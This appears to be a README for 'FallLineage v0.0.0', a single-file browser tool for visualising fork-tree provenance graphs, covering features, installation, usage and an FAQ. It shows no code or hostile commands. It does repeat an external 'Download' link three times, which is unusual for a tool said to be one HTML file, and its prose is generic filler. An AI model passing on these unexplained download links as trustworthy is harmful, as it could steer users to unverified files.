# FallLineage v0.0.0 - fork-tree visualizer 2026

> **FallLineage is a browser-based fork-tree visualizer that converts provenance data into a signed graph, supports offline operation, and ships as a single HTML file with no build step.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordan-reedtfm1243/falllineage-no-build-graph?style=flat-square)](https://github.com/jordan-reedtfm1243/falllineage-no-build-graph)

---

<p align="center">
  <a href="https://jordan-reedtfm1243.github.io/falllineage-no-build-graph/">
    <img src="https://img.shields.io/badge/Download-FallLineage%20Latest-brightgreen?style=for-the-badge" alt="Download FallLineage">
  </a>
</p>

> **[Direct Download - FallLineage v0.0.0](https://jordan-reedtfm1243.github.io/falllineage-no-build-graph/)**

---

[Download Latest Build](https://jordan-reedtfm1243.github.io/falllineage-no-build-graph/)

---

## What FallLineage Does

FallLineage is meant for exploring fork-tree ancestry in the browser as a provenance graph that is straightforward to audit and understand. It highlights how branches relate to one another, how ownership or royalty flows are annotated, and how the structure can be examined without depending on outside services.

It is a strong match for workflows that need a self-contained viewer for imported fork-tree JSON. With offline support, local persistence, and signed graph concepts, the full experience remains packaged inside one HTML file.

---

## Key Capabilities

- Shows fork-tree ancestry as a provenance graph
- Accepts fork-tree JSON as structured input
- Renders royalty flows with labeled arrows
- Exports the active view to SVG
- Operates as one HTML file with no build step
- Functions offline with IndexedDB and a service worker
- Uses Ed25519 keypairs via WebCrypto
- Performs no external requests while running

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/jordan-reedtfm1243/falllineage-no-build-graph.git
2. Open the main HTML file in a modern web browser.
3. If you want to serve it locally, use any static file server and load the page in the browser.

No separate build phase is needed.

---

## How to Use It

1. Launch the app in your browser.
2. Import a fork-tree JSON file.
3. Inspect the provenance graph and the labeled royalty flow paths.
4. Export the visualization to SVG when you need something shareable or suitable for archiving.

Typical workflow:

- Load data
- Inspect ancestry links
- Confirm graph labels and flow annotations
- Save the SVG export

---

## Configuration

FallLineage is designed to keep its state inside the browser environment.

- IndexedDB handles local persistence
- The service worker enables offline behavior
- WebCrypto provides Ed25519 keypair handling

If you need to change behavior, check the settings saved in the browser after the app has been opened. No external configuration service is required.

---

## Requirements

- A modern web browser with JavaScript enabled
- IndexedDB support
- Service worker support for offline use
- WebCrypto support for Ed25519 operations
- Enough local storage for imported data and browser state

---

## FAQ

### Does it require a backend?
No. FallLineage is built to run as a browser-based single-file tool.

### Will it run without an internet connection?
Yes. Offline use is part of the design, as long as the browser supports the required features.

### Where is the data kept?
Local browser storage is used through IndexedDB, together with other browser-managed state.

### How do I update it?
Replace the HTML file or redeploy the latest build from the project location you use.

### What if the page does not load properly?
Verify browser compatibility, clear local site data if needed, and confirm that service worker support is available in the browser you are using.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
